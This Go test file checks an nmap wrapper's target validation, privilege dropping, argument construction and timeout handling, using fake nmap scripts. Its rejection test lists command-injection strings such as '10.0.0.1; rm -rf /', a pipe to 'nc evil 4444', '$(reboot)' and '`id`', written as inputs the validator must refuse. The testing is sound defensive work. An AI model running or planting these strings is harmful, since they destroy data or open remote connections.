//go:build !windows

package netscan

import (
	"bytes"
	"context"
	"errors"
	"net"
	"os"
	"os/user"
	"path/filepath"
	"reflect"
	"runtime"
	"strings"
	"syscall"
	"testing"
	"time"
)

func TestValidateTargetAccepts(t *testing.T) {
	valid := []string{
		"10.0.0.0/24",
		"192.168.1.0/24",
		"10.0.0.0/8", // exactly at the IPv4 breadth limit
		"10.0.0.1-50",
		"10.0.0.1,2,3",
		"192.168.1-10.0-255",
		"192.168.1.1",
	}
	for _, tc := range valid {
		if err := ValidateTarget(tc); err != nil {
			t.Errorf("ValidateTarget(%q) = %v, want nil", tc, err)
		}
	}
}

func TestValidateTargetRejects(t *testing.T) {
	invalid := []string{
		"",
		"--script=http-vuln",
		"-oN /tmp/x",
		"-sV",
		"10.0.0.1; rm -rf /",
		"10.0.0.1 | nc evil 4444",
		"$(reboot)",
		"`id`",
		"10.0.0.1 --script=x",
		"host&whoami",
		"a<b",
		"a>b",
		"a'b",
		"a\"b",
		"10.0.0.1\n-sV",
		"-",
		// Over-broad CIDRs the root sensor must never scan (GHSA-c5gj).
		"0.0.0.0/0",
		"10.0.0.0/7",
		"128.0.0.0/1",
		"::/0",
		"2001:db8::/31",
		"2001:db8::1",
		"2001:db8::/32",
		"::ffff:192.0.2.7",
		"::ffff:192.0.2.7/128",
		"host.example.com",
		"scanner-01.internal",
		"a",
		"999.0.0.1",
		"10.0.0.1-999",
	}
	for _, tc := range invalid {
		if err := ValidateTarget(tc); err == nil {
			t.Errorf("ValidateTarget(%q) = nil, want error", tc)
		}
	}
}

func TestNewScannerUsesAbsoluteConfiguredPath(t *testing.T) {
	path := writeExecutable(t, "printf '<nmaprun><runstats><finished elapsed=\"0\"/></runstats></nmaprun>'\n")
	t.Setenv("VEDETTA_NMAP_PATH", path)

	scanner, err := NewScanner()
	if err != nil {
		t.Fatalf("NewScanner() error = %v", err)
	}
	if scanner.BinaryPath != path {
		t.Fatalf("BinaryPath = %q, want %q", scanner.BinaryPath, path)
	}
}

func TestNewScannerRejectsRelativeConfiguredPath(t *testing.T) {
	t.Setenv("VEDETTA_NMAP_PATH", "relative/nmap")
	if _, err := NewScanner(); err == nil || !strings.Contains(err.Error(), "must be absolute") {
		t.Fatalf("NewScanner() error = %v, want absolute-path rejection", err)
	}
}

func TestExecutableCapabilitiesFailClosed(t *testing.T) {
	if err := rejectExecutableCapabilities("/synthetic/nmap", func(string) (bool, error) { return true, nil }); err == nil {
		t.Fatal("capability-bearing executable accepted")
	}
	if err := rejectExecutableCapabilities("/synthetic/nmap", func(string) (bool, error) { return false, errors.New("xattr unavailable") }); err == nil {
		t.Fatal("capability inspection error accepted")
	}
	if err := rejectExecutableCapabilities("/synthetic/nmap", func(string) (bool, error) { return false, nil }); err != nil {
		t.Fatalf("capability-free executable rejected: %v", err)
	}
}

func TestNewScannerStoresAndExecutesCanonicalPath(t *testing.T) {
	target := writeExecutable(t, "printf 'Nmap version 7.95\\n'\n")
	link := filepath.Join(t.TempDir(), "nmap-link")
	if err := os.Symlink(target, link); err != nil {
		t.Fatal(err)
	}
	t.Setenv("VEDETTA_NMAP_PATH", link)
	scanner, err := NewScanner()
	if err != nil {
		t.Fatal(err)
	}
	if scanner.BinaryPath != target {
		t.Fatalf("canonical path = %q, want %q", scanner.BinaryPath, target)
	}
	if err := scanner.Check(context.Background()); err != nil {
		t.Fatalf("Check exact runner: %v", err)
	}
}

func TestValidatePrivilegedNmapTrustBoundary(t *testing.T) {
	secure := map[string]pathSecurity{
		"/":             {mode: os.ModeDir | 0o755, uid: 0},
		"/usr":          {mode: os.ModeDir | 0o755, uid: 0},
		"/usr/bin":      {mode: os.ModeDir | 0o755, uid: 0},
		"/usr/sbin":     {mode: os.ModeDir | 0o755, uid: 0},
		"/usr/bin/nmap": {mode: 0o755, uid: 0},
	}
	stat := func(path string) (pathSecurity, error) {
		value, ok := secure[path]
		if !ok {
			return pathSecurity{}, os.ErrNotExist
		}
		return value, nil
	}
	if err := validatePrivilegedNmap("/usr/bin/nmap", 0, "linux", stat); err != nil {
		t.Fatalf("secure system nmap rejected: %v", err)
	}
	for _, tc := range []struct {
		name string
		path string
		euid int
		goos string
	}{
		{"custom path", "/opt/nmap", 0, "linux"},
		{"non-root parent", "/usr/bin/nmap", 1000, "linux"},
		{"non-linux", "/usr/bin/nmap", 0, "darwin"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			if err := validatePrivilegedNmap(tc.path, tc.euid, tc.goos, stat); err == nil {
				t.Fatal("unsafe privileged runner accepted")
			}
		})
	}

	for _, tc := range []struct {
		name   string
		path   string
		mutate func(pathSecurity) pathSecurity
	}{
		{"executable group writable", "/usr/bin/nmap", func(v pathSecurity) pathSecurity { v.mode |= 0o020; return v }},
		{"ancestor world writable", "/usr/bin", func(v pathSecurity) pathSecurity { v.mode |= 0o002; return v }},
		{"executable non-root", "/usr/bin/nmap", func(v pathSecurity) pathSecurity { v.uid = 501; return v }},
		{"executable not regular", "/usr/bin/nmap", func(v pathSecurity) pathSecurity { v.mode = os.ModeDir | 0o755; return v }},
		{"executable not executable", "/usr/bin/nmap", func(v pathSecurity) pathSecurity { v.mode = 0o644; return v }},
		{"executable setuid", "/usr/bin/nmap", func(v pathSecurity) pathSecurity { v.mode |= os.ModeSetuid; return v }},
	} {
		t.Run(tc.name, func(t *testing.T) {
			bad := make(map[string]pathSecurity, len(secure))
			for path, value := range secure {
				bad[path] = value
			}
			bad[tc.path] = tc.mutate(bad[tc.path])
			badStat := func(path string) (pathSecurity, error) { return bad[path], nil }
			if err := validatePrivilegedNmap("/usr/bin/nmap", 0, "linux", badStat); err == nil {
				t.Fatal("unsafe mode/owner accepted")
			}
		})
	}
}

func TestTrustedNeighborReaderRejectsWritableAncestry(t *testing.T) {
	metadata := map[string]pathSecurity{
		"/":             {mode: os.ModeDir | 0o755, uid: 0},
		"/usr":          {mode: os.ModeDir | 0o755, uid: 0},
		"/usr/sbin":     {mode: os.ModeDir | 0o755, uid: 0},
		"/usr/sbin/arp": {mode: 0o755, uid: 0},
	}
	stat := func(path string) (pathSecurity, error) { return metadata[path], nil }
	if err := validateTrustedRootPath("/usr/sbin/arp", stat); err != nil {
		t.Fatalf("secure neighbor reader rejected: %v", err)
	}
	value := metadata["/usr/sbin"]
	value.mode |= 0o002
	metadata["/usr/sbin"] = value
	if err := validateTrustedRootPath("/usr/sbin/arp", stat); err == nil {
		t.Fatal("world-writable neighbor-reader ancestry accepted")
	}
}

func TestPrivilegedDiscoveryRequiresContainedAttachedIPv4Target(t *testing.T) {
	_, lan24, _ := net.ParseCIDR("192.0.2.7/24")
	_, other24, _ := net.ParseCIDR("198.51.100.4/24")
	networks := []net.IPNet{*lan24, *other24}
	for _, target := range []string{"192.0.2.9", "192.0.2.0/24", "198.51.100.0/24", "198.51.100.4/32"} {
		if !targetLocallyAttachedIPv4(target, networks) {
			t.Errorf("locally attached target %q rejected", target)
		}
	}
	for _, target := range []string{"203.0.113.1", "192.0.0.0/16", "0.0.0.0/8", "2001:db8::1", "router.example", "192.0.2.1-20"} {
		if targetLocallyAttachedIPv4(target, networks) {
			t.Errorf("non-contained/non-IPv4 target %q accepted", target)
		}
	}
}

func TestScannerPrivilegeSelectionFailsClosed(t *testing.T) {
	_, lan, _ := net.ParseCIDR("192.0.2.8/24")
	scanner := &Scanner{
		privilegedDiscoveryEligible: true,
		localNetworks:               func() ([]net.IPNet, error) { return []net.IPNet{*lan}, nil },
	}
	if !scanner.shouldUsePrivilegedDiscovery("192.0.2.0/24") {
		t.Fatal("secure attached target did not select privileged discovery")
	}
	if scanner.shouldUsePrivilegedDiscovery("198.51.100.0/24") {
		t.Fatal("off-link target selected privileged discovery")
	}
	scanner.localNetworks = func() ([]net.IPNet, error) { return nil, errors.New("interfaces unavailable") }
	if scanner.shouldUsePrivilegedDiscovery("192.0.2.0/24") {
		t.Fatal("interface lookup failure selected privileged discovery")
	}
}

func TestNmapArgsSeparatePrivilegeAndPorts(t *testing.T) {
	if got, want := discoveryArgs("192.0.2.0/24", false), []string{"--unprivileged", "-sn", "-n", "-oX", "-", "--", "192.0.2.0/24"}; !reflect.DeepEqual(got, want) {
		t.Fatalf("unprivileged discovery args = %#v, want %#v", got, want)
	}
	if got, want := discoveryArgs("192.0.2.0/24", true), []string{"--privileged", "-sn", "-n", "-PR", "-oX", "-", "--", "192.0.2.0/24"}; !reflect.DeepEqual(got, want) {
		t.Fatalf("privileged discovery args = %#v, want %#v", got, want)
	}
	got := portScanArgs([]string{"192.0.2.7", "192.0.2.9"})
	want := []string{"--unprivileged", "-Pn", "-n", "-sT", "--top-ports", "100", "-T4", "-oX", "-", "--", "192.0.2.7", "192.0.2.9"}
	if !reflect.DeepEqual(got, want) {
		t.Fatalf("port args = %#v, want %#v", got, want)
	}
	for _, arg := range append(discoveryArgs("192.0.2.0/24", true), got...) {
		if arg == "-sS" || strings.HasPrefix(arg, "--script") || arg == "-sV" {
			t.Fatalf("unsafe scan argument retained: %q", arg)
		}
	}
}

func TestSupportedNmapTargetRejectsFalseEmptyFamilies(t *testing.T) {
	for _, target := range []string{"2001:db8::1", "2001:db8::/64", "::ffff:192.0.2.7", "::ffff:192.0.2.7/128", "missing.invalid", "scanner-01.internal", "999.0.0.1"} {
		if supportedNmapIPv4Target(target) {
			t.Errorf("unsupported target %q accepted", target)
		}
	}
	for _, target := range []string{"192.0.2.9", "192.0.2.0/24", "192.0.2.1-20", "192.0.2.1,3-4"} {
		if !supportedNmapIPv4Target(target) {
			t.Errorf("supported IPv4 target %q rejected", target)
		}
	}
}

func TestParseNmapXMLRejectsSkippedTargets(t *testing.T) {
	xml := []byte(`<nmaprun><target specification="999.0.0.1" status="skipped" reason="invalid"/><runstats><finished elapsed="0" exit="success"/></runstats></nmaprun>`)
	if _, _, err := parseNmapXMLDetailed(xml, time.Now(), 0); err == nil || !strings.Contains(err.Error(), "skipped") {
		t.Fatalf("skipped Nmap target error = %v, want explicit failure", err)
	}
}

func TestARPInterfaceEligibilityExcludesTunnels(t *testing.T) {
	if !arpCapableInterface(net.FlagUp | net.FlagBroadcast) {
		t.Fatal("ordinary broadcast interface rejected")
	}
	for _, flags := range []net.Flags{
		net.FlagBroadcast,
		net.FlagUp | net.FlagLoopback | net.FlagBroadcast,
		net.FlagUp | net.FlagPointToPoint | net.FlagBroadcast,
		net.FlagUp,
	} {
		if arpCapableInterface(flags) {
			t.Fatalf("non-ARP interface flags %v accepted", flags)
		}
	}
}

func TestCommandScrubsEnvironmentAndClearsGroups(t *testing.T) {
	path := writeExecutable(t, "exit 0\n")
	scanner := &Scanner{
		BinaryPath: path,
		credential: &syscall.Credential{
			Uid:    65534,
			Gid:    65534,
			Groups: []uint32{0, 80},
		},
	}
	args := discoveryArgs("192.0.2.1", false)
	cmd, err := scanner.command(context.Background(), args)
	if err != nil {
		t.Fatalf("command() error = %v", err)
	}
	if cmd.Path != scanner.BinaryPath {
		t.Fatalf("command path = %q, want direct exec %q", cmd.Path, scanner.BinaryPath)
	}
	if !reflect.DeepEqual(cmd.Args, append([]string{scanner.BinaryPath}, args...)) {
		t.Fatalf("command args = %#v", cmd.Args)
	}
	if !reflect.DeepEqual(cmd.Env, minimalNmapEnvironment) {
		t.Fatalf("command env = %#v, want %#v", cmd.Env, minimalNmapEnvironment)
	}
	if cmd.Dir != "/" {
		t.Fatalf("command dir = %q, want /", cmd.Dir)
	}
	if cmd.SysProcAttr == nil || !cmd.SysProcAttr.Setpgid {
		t.Fatal("command does not create a dedicated process group")
	}
	credential := cmd.SysProcAttr.Credential
	if credential == nil {
		t.Fatal("command did not install the unprivileged credential")
	}
	if credential.Uid != 65534 || credential.Gid != 65534 {
		t.Fatalf("credential = %d:%d, want 65534:65534", credential.Uid, credential.Gid)
	}
	if credential.Groups == nil || len(credential.Groups) != 0 || credential.NoSetGroups {
		t.Fatalf("supplementary groups were not explicitly cleared: %#v", credential)
	}
	if cmd.Cancel == nil || cmd.WaitDelay != childWaitDelay {
		t.Fatal("command lacks bounded cancellation")
	}
}

func TestCommandRejectsNonAbsoluteBinary(t *testing.T) {
	scanner := &Scanner{BinaryPath: "nmap"}
	if _, err := scanner.command(context.Background(), nil); err == nil || !strings.Contains(err.Error(), "not absolute") {
		t.Fatalf("command() error = %v, want non-absolute rejection", err)
	}
}

func TestNmapCredentialDropsRootAndClearsGroups(t *testing.T) {
	lookups := []string{}
	lookup := func(name string) (*user.User, error) {
		lookups = append(lookups, name)
		if name == "_nobody" {
			return nil, errors.New("not found")
		}
		return &user.User{Uid: "65534", Gid: "65533", Username: name}, nil
	}

	credential, err := nmapCredential(0, "darwin", lookup)
	if err != nil {
		t.Fatalf("nmapCredential() error = %v", err)
	}
	if !reflect.DeepEqual(lookups, []string{"_nobody", "nobody"}) {
		t.Fatalf("lookup order = %#v", lookups)
	}
	if credential.Uid != 65534 || credential.Gid != 65533 {
		t.Fatalf("credential = %d:%d", credential.Uid, credential.Gid)
	}
	if credential.Groups == nil || len(credential.Groups) != 0 || credential.NoSetGroups {
		t.Fatalf("credential does not clear supplementary groups: %#v", credential)
	}
}

func TestNmapCredentialNonRootRunsAsSelf(t *testing.T) {
	called := false
	credential, err := nmapCredential(501, runtime.GOOS, func(string) (*user.User, error) {
		called = true
		return nil, errors.New("unexpected lookup")
	})
	if err != nil || credential != nil || called {
		t.Fatalf("nmapCredential(non-root) = %#v, %v; lookup called=%v", credential, err, called)
	}
}

func TestCommandActuallyDropsRootCredential(t *testing.T) {
	if os.Geteuid() != 0 {
		t.Skip("requires a root parent to verify the real setuid/setgroups boundary")
	}
	if _, err := os.Stat("/usr/bin/id"); err != nil {
		t.Skipf("/usr/bin/id unavailable: %v", err)
	}
	credential, err := nmapCredential(0, runtime.GOOS, user.Lookup)
	if err != nil {
		t.Fatalf("nmapCredential() error = %v", err)
	}
	idRunner := writeExecutable(t, `exec /usr/bin/id "$@"`+"\n")
	scanner := &Scanner{BinaryPath: idRunner, credential: credential}

	cmd, err := scanner.command(context.Background(), []string{"-u"})
	if err != nil {
		t.Fatalf("command() error = %v", err)
	}
	var stdout bytes.Buffer
	cmd.Stdout = &stdout
	if err := cmd.Run(); err != nil {
		t.Fatalf("id -u: %v", err)
	}
	uid, err := parseCredentialID(strings.TrimSpace(stdout.String()))
	if err != nil {
		t.Fatalf("parse child uid %q: %v", stdout.String(), err)
	}
	if uid != credential.Uid || uid == 0 {
		t.Fatalf("child uid = %d, want unprivileged %d", uid, credential.Uid)
	}

	cmd, err = scanner.command(context.Background(), []string{"-G"})
	if err != nil {
		t.Fatalf("groups command: %v", err)
	}
	stdout.Reset()
	cmd.Stdout = &stdout
	if err := cmd.Run(); err != nil {
		t.Fatalf("id -G: %v", err)
	}
	for _, group := range strings.Fields(stdout.String()) {
		gid, err := parseCredentialID(group)
		if err != nil {
			t.Fatalf("parse child group %q: %v", group, err)
		}
		if gid == 0 {
			t.Fatalf("child retained root supplementary group: %q", stdout.String())
		}
	}
}

func TestParseCredentialIDAcceptsDarwinNobody(t *testing.T) {
	for _, raw := range []string{"4294967294", "-2"} {
		got, err := parseCredentialID(raw)
		if err != nil {
			t.Fatalf("parseCredentialID(%q) error = %v", raw, err)
		}
		if got != ^uint32(1) {
			t.Fatalf("parseCredentialID(%q) = %d, want %d", raw, got, ^uint32(1))
		}
	}
}

func TestScanPreservesNmapParsing(t *testing.T) {
	path := writeExecutable(t, `cat <<'EOF'
<nmaprun>
  <host><status state="up"/><address addr="192.0.2.9" addrtype="ipv4"/><hostnames><hostname name="camera.example" type="PTR"/></hostnames></host>
  <runstats><finished elapsed="0.125"/></runstats>
</nmaprun>
EOF
`)
	scanner := testScanner(t, path)
	result, err := scanner.Scan("192.0.2.9", false)
	if err != nil {
		t.Fatalf("Scan() error = %v", err)
	}
	if len(result.Hosts) != 1 || result.Hosts[0].IPAddress != "192.0.2.9" || result.Hosts[0].Hostname != "camera.example" {
		t.Fatalf("Scan() hosts = %#v", result.Hosts)
	}
}

func TestScanWithPortsDiscoversThenProbesAndMerges(t *testing.T) {
	path := writeExecutable(t, `
case " $* " in
  *" -Pn "*)
    cat <<'EOF'
<nmaprun>
  <host><status state="up"/><address addr="192.0.2.9" addrtype="ipv4"/><ports>
    <port protocol="tcp" portid="443"><state state="open"/></port>
    <port protocol="tcp" portid="22"><state state="open"/></port>
  </ports></host>
  <host><status state="up"/><address addr="192.0.2.99" addrtype="ipv4"/><ports><port protocol="tcp" portid="1"><state state="open"/></port></ports></host>
  <runstats><finished elapsed="0.02" exit="success"/></runstats>
</nmaprun>
EOF
    ;;
  *)
    cat <<'EOF'
<nmaprun>
  <host><status state="up"/><address addr="192.0.2.9" addrtype="ipv4"/><address addr="00:00:5E:00:53:01" addrtype="mac" vendor="CameraCo"/><hostnames><hostname name="camera.example" type="PTR"/></hostnames></host>
  <runstats><finished elapsed="0.01" exit="success"/></runstats>
</nmaprun>
EOF
    ;;
esac
`)
	scanner := testScanner(t, path)
	result, err := scanner.Scan("192.0.2.0/24", true)
	if err != nil {
		t.Fatal(err)
	}
	if len(result.Hosts) != 1 {
		t.Fatalf("hosts = %#v; port output expanded discovery allowlist", result.Hosts)
	}
	host := result.Hosts[0]
	if host.MACAddress != "00:00:5E:00:53:01" || host.Vendor != "CameraCo" || host.Hostname != "camera.example" {
		t.Fatalf("discovery identity was not preserved: %#v", host)
	}
	if !reflect.DeepEqual(host.OpenPorts, []int{22, 443}) {
		t.Fatalf("merged ports = %#v", host.OpenPorts)
	}
}

func TestNeighborDeltaMergeIsConservative(t *testing.T) {
	result := &ScanResult{Hosts: []DiscoveredHost{{IPAddress: "192.0.2.2", Status: "up", DiscoverySource: "active_nmap"}}}
	before := map[string]string{
		"192.0.2.2": "00:00:5e:00:53:02", // unchanged: may enrich only an independently live host
		"192.0.2.3": "00:00:5e:00:53:03", // changed during scan
	}
	after := map[string]string{
		"192.0.2.2":    "00:00:5e:00:53:02",
		"192.0.2.3":    "00:00:5e:00:53:04",
		"192.0.2.4":    "00:00:5e:00:53:05", // new during scan
		"198.51.100.4": "00:00:5e:00:53:06", // outside target
		"192.0.2.5":    "ff:ff:ff:ff:ff:ff", // invalid/broadcast
	}
	mergeNeighborDelta(result, before, after, "192.0.2.0/24")
	if result.Hosts[0].MACAddress != "00:00:5e:00:53:02" || !strings.Contains(result.Hosts[0].DiscoverySource, "neighbor_cache_confirmed") {
		t.Fatalf("unchanged neighbor did not enrich the independently live host: %#v", result.Hosts[0])
	}
	if len(result.Hosts) != 3 {
		t.Fatalf("delta hosts = %#v", result.Hosts)
	}
	got := map[string]string{}
	for _, host := range result.Hosts {
		got[host.IPAddress] = host.MACAddress
		if host.IPAddress != "192.0.2.2" && host.DiscoverySource != "neighbor_cache_delta" {
			t.Fatalf("delta source overclaimed: %#v", host)
		}
	}
	if got["192.0.2.3"] != "00:00:5e:00:53:04" || got["192.0.2.4"] != "00:00:5e:00:53:05" {
		t.Fatalf("valid neighbor delta missing: %#v", got)
	}
}

func TestNeighborDeltaMergeSurvivesHostSliceReallocation(t *testing.T) {
	// The lower-sorted new neighbor forces an append (and therefore a backing-array
	// reallocation) before the existing higher-sorted host is enriched.
	hosts := make([]DiscoveredHost, 1, 1)
	hosts[0] = DiscoveredHost{IPAddress: "192.0.2.9", Status: "up", DiscoverySource: "active_nmap"}
	result := &ScanResult{Hosts: hosts}
	before := map[string]string{"192.0.2.9": "00:00:5e:00:53:09"}
	after := map[string]string{
		"192.0.2.2": "00:00:5e:00:53:02",
		"192.0.2.9": "00:00:5e:00:53:09",
	}

	mergeNeighborDelta(result, before, after, "192.0.2.0/24")

	if len(result.Hosts) != 2 {
		t.Fatalf("hosts after neighbor merge = %#v", result.Hosts)
	}
	if got := result.Hosts[0]; got.MACAddress != "00:00:5e:00:53:09" || !strings.Contains(got.DiscoverySource, "neighbor_cache_confirmed") {
		t.Fatalf("existing host lost enrichment after append reallocation: %#v", got)
	}
}

func TestNeighborDeltaMergeSupportsNumericRangeLists(t *testing.T) {
	result := &ScanResult{Hosts: []DiscoveredHost{{
		IPAddress: "192.0.2.12", Status: "up", DiscoverySource: "active_nmap",
	}}}
	before := map[string]string{"192.0.2.12": "00:00:5e:00:53:12"}
	after := map[string]string{
		"192.0.2.10": "00:00:5e:00:53:10",
		"192.0.2.11": "00:00:5e:00:53:11", // outside the requested list
		"192.0.2.12": "00:00:5e:00:53:12", // unchanged, but Nmap confirmed it live
	}

	mergeNeighborDelta(result, before, after, "192.0.2.10,12-13")

	if len(result.Hosts) != 2 {
		t.Fatalf("numeric range/list neighbor merge = %#v", result.Hosts)
	}
	got := make(map[string]DiscoveredHost, len(result.Hosts))
	for _, host := range result.Hosts {
		got[host.IPAddress] = host
	}
	if host, ok := got["192.0.2.10"]; !ok || host.MACAddress != "00:00:5e:00:53:10" {
		t.Fatalf("in-range delta missing: %#v", got)
	}
	if _, ok := got["192.0.2.11"]; ok {
		t.Fatalf("out-of-range delta admitted: %#v", got)
	}
	confirmed := got["192.0.2.12"]
	if confirmed.MACAddress != "00:00:5e:00:53:12" || !strings.Contains(confirmed.DiscoverySource, "neighbor_cache_confirmed") {
		t.Fatalf("in-range unchanged neighbor did not enrich Nmap host: %#v", confirmed)
	}
}

func TestLinuxNeighborParserExcludesIncompleteAndInvalidEntries(t *testing.T) {
	input := strings.NewReader(`IP address       HW type     Flags       HW address            Mask     Device
192.0.2.2         0x1         0x2         00:00:5e:00:53:02     *        eth0
192.0.2.3         0x1         0x0         00:00:5e:00:53:03     *        eth0
192.0.2.4         0x1         0x2         00:00:00:00:00:00     *        eth0
192.0.2.255       0x1         0x2         ff:ff:ff:ff:ff:ff     *        eth0
malformed
`)
	got, err := parseLinuxNeighbors(context.Background(), input)
	if err != nil {
		t.Fatal(err)
	}
	want := map[string]string{"192.0.2.2": "00:00:5e:00:53:02"}
	if !reflect.DeepEqual(got, want) {
		t.Fatalf("parsed neighbors = %#v, want %#v", got, want)
	}
}

func TestNeighborDeltaOnlyRunsAfterCompleteSuccessfulDiscovery(t *testing.T) {
	path := writeExecutable(t, `cat <<'EOF'
<nmaprun><host><status state="up"/><address addr="192.0.2.9" addrtype="ipv4"/></host><runstats><finished elapsed="0.1"/></runstats></nmaprun>
EOF
`)
	scanner := testScanner(t, path)
	calls := 0
	scanner.neighborSnapshot = func(context.Context) (map[string]string, error) {
		calls++
		if calls == 1 {
			return map[string]string{}, nil
		}
		return map[string]string{"192.0.2.10": "00:00:5e:00:53:07"}, nil
	}
	result, err := scanner.Scan("192.0.2.0/24", false)
	if err != nil {
		t.Fatal(err)
	}
	if calls != 1 || len(result.Hosts) != 1 {
		t.Fatalf("incomplete run consumed post-snapshot or merged it: calls=%d hosts=%#v", calls, result.Hosts)
	}
}

func TestCheckRunsExactVersionCommandAndRequiresSuccess(t *testing.T) {
	good := writeExecutable(t, `if [ "$#" -ne 1 ] || [ "$1" != "--version" ]; then exit 90; fi
printf 'Nmap version 7.95\n'
`)
	if err := testScanner(t, good).Check(context.Background()); err != nil {
		t.Fatalf("Check() error = %v", err)
	}
	bad := writeExecutable(t, "exit 23\n")
	if err := testScanner(t, bad).Check(context.Background()); err == nil || !strings.Contains(err.Error(), "unsuccessfully") {
		t.Fatalf("Check() error = %v, want exact-runner execution failure", err)
	}
}

func TestCheckHonorsShortCallerDeadline(t *testing.T) {
	path := writeExecutable(t, "sleep 10\n")
	ctx, cancel := context.WithTimeout(context.Background(), 75*time.Millisecond)
	defer cancel()
	started := time.Now()
	err := testScanner(t, path).Check(ctx)
	if !errors.Is(err, context.DeadlineExceeded) {
		t.Fatalf("Check() error = %v, want deadline exceeded", err)
	}
	if elapsed := time.Since(started); elapsed > 2*time.Second {
		t.Fatalf("self-check deadline took %s", elapsed)
	}
}

func TestScanContextCallerCancellationKillsProcessGroup(t *testing.T) {
	path := writeExecutable(t, "sleep 10\n")
	scanner := testScanner(t, path)
	ctx, cancel := context.WithCancel(context.Background())
	time.AfterFunc(75*time.Millisecond, cancel)
	started := time.Now()
	_, err := scanner.ScanContext(ctx, "192.0.2.1", false)
	if !errors.Is(err, context.Canceled) {
		t.Fatalf("ScanContext() error = %v, want context.Canceled", err)
	}
	if elapsed := time.Since(started); elapsed > 2*time.Second {
		t.Fatalf("cancellation took %s; child group was not terminated promptly", elapsed)
	}
}

func TestScanTimesOutAndKillsProcessGroup(t *testing.T) {
	path := writeExecutable(t, "sleep 10\n")
	scanner := testScanner(t, path)
	scanner.timeout = 100 * time.Millisecond

	started := time.Now()
	_, err := scanner.Scan("192.0.2.1", false)
	if err == nil || !strings.Contains(err.Error(), "timed out") {
		t.Fatalf("Scan() error = %v, want timeout", err)
	}
	if elapsed := time.Since(started); elapsed > 2*time.Second {
		t.Fatalf("timeout took %s; process group was not terminated promptly", elapsed)
	}
}

func TestScanRejectsTruncatedStdout(t *testing.T) {
	path := writeExecutable(t, "while :; do printf xxxxxxxxxxxxxxxx; done\n")
	scanner := testScanner(t, path)
	scanner.maxStdout = 32

	started := time.Now()
	_, err := scanner.Scan("192.0.2.1", false)
	if err == nil || !strings.Contains(err.Error(), "stdout exceeded 32-byte limit") {
		t.Fatalf("Scan() error = %v, want stdout truncation", err)
	}
	if elapsed := time.Since(started); elapsed > 2*time.Second {
		t.Fatalf("stdout truncation took %s; noisy process was not terminated promptly", elapsed)
	}
}

func TestScanRejectsTruncatedStderr(t *testing.T) {
	path := writeExecutable(t, "i=0; while [ \"$i\" -lt 200 ]; do printf x >&2; i=$((i+1)); done; exit 1\n")
	scanner := testScanner(t, path)
	scanner.maxStderr = 32

	_, err := scanner.Scan("192.0.2.1", false)
	if err == nil || !strings.Contains(err.Error(), "stderr exceeded 32-byte limit") {
		t.Fatalf("Scan() error = %v, want stderr truncation", err)
	}
}

func testScanner(t *testing.T, path string) *Scanner {
	t.Helper()
	scanner := &Scanner{
		BinaryPath: path,
		timeout:    2 * time.Second,
		maxStdout:  1 << 20,
		maxStderr:  1 << 20,
	}
	if os.Geteuid() == 0 {
		credential, err := nmapCredential(0, runtime.GOOS, user.Lookup)
		if err != nil {
			t.Fatalf("test host has no nobody account: %v", err)
		}
		scanner.credential = credential
	}
	return scanner
}

func writeExecutable(t *testing.T, body string) string {
	t.Helper()
	dir := t.TempDir()
	if os.Geteuid() == 0 {
		// macOS can retain a caller TMPDIR whose ancestors are mode 0700. A
		// root test deliberately drops the child to nobody, so put the fixture
		// under the sticky, traversable system temp directory instead.
		dir = "/tmp"
	}
	file, err := os.CreateTemp(dir, "vedetta-fake-nmap-*")
	if err != nil {
		t.Fatalf("create fake nmap: %v", err)
	}
	content := "#!/bin/sh\nset -eu\n" + body
	if _, err := file.WriteString(content); err != nil {
		t.Fatalf("write fake nmap: %v", err)
	}
	if err := file.Close(); err != nil {
		t.Fatalf("close fake nmap: %v", err)
	}
	path := file.Name()
	if canonical, err := filepath.EvalSymlinks(path); err == nil {
		path = canonical
	}
	t.Cleanup(func() { _ = os.Remove(path) })
	if err := os.Chmod(path, 0o755); err != nil {
		t.Fatalf("make fake nmap executable: %v", err)
	}
	return path
}
